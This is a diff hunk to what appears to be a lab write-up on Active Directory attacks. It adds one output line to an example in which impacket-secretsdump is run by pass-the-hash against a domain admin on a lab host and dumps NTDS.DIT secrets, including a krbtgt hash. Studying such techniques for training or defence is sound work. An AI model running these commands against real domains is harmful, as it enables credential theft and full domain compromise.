@@ -771,6 +771,7 @@ If you already have password or hash of domain admin user, the attack can be per
 ┌──(root㉿kali)-[~]
 └─# impacket-secretsdump -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 lab.vx/domainadmin@192.168.17.11
 ⋮
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
 ⋮
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:09320ee4ca4f627b183bba1335d1c0c7:::
